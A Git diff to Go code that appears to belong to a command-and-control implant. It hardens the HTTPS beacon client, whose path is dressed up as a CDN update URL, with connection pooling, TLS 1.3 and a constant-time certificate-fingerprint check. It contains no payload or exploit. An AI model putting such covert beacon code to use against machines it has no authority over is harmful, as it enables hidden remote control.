@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"context"
 	"crypto/sha256"
+	"crypto/subtle"
 	"crypto/tls"
 	"errors"
 	"fmt"
@@ -11,11 +12,13 @@ import (
 	"net"
 	"net/http"
 	"time"
+
+	"github.com/aelder202/sable/internal/protocol"
 )
 
 const (
 	beaconPath                 = "/cdn/static/update"
-	maxHTTPSTaskResponseBytes  = 72 * 1024 * 1024
+	maxHTTPSTaskResponseBytes  = protocol.MaxHTTPSTaskResponseBytes
 	httpsBeaconResponseTimeout = 2 * time.Minute
 )
 
@@ -24,13 +27,17 @@ const (
 // InsecureSkipVerify is intentional. Manual fingerprint verification replaces CA chain validation.
 func newPinnedClient(expectedFP []byte) *http.Client {
 	transport := &http.Transport{
-		DisableKeepAlives:     true,
+		MaxIdleConns:          4,
+		MaxIdleConnsPerHost:   2,
+		IdleConnTimeout:       30 * time.Second,
 		TLSHandshakeTimeout:   10 * time.Second,
 		ResponseHeaderTimeout: 10 * time.Second,
+		ForceAttemptHTTP2:     true,
 		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
 			dialer := &tls.Dialer{
 				NetDialer: &net.Dialer{Timeout: 10 * time.Second},
 				Config: &tls.Config{
+					MinVersion:         tls.VersionTLS13,
 					InsecureSkipVerify: true, //nolint:gosec // replaced by manual fingerprint check below
 				},
 			}
@@ -49,7 +56,7 @@ func newPinnedClient(expectedFP []byte) *http.Client {
 				return nil, errors.New("no TLS certificates presented by server")
 			}
 			fp := sha256.Sum256(certs[0].Raw)
-			if !bytes.Equal(fp[:], expectedFP) {
+			if subtle.ConstantTimeCompare(fp[:], expectedFP) != 1 {
 				conn.Close()
 				return nil, fmt.Errorf("TLS certificate fingerprint mismatch: MITM detected")
 			}
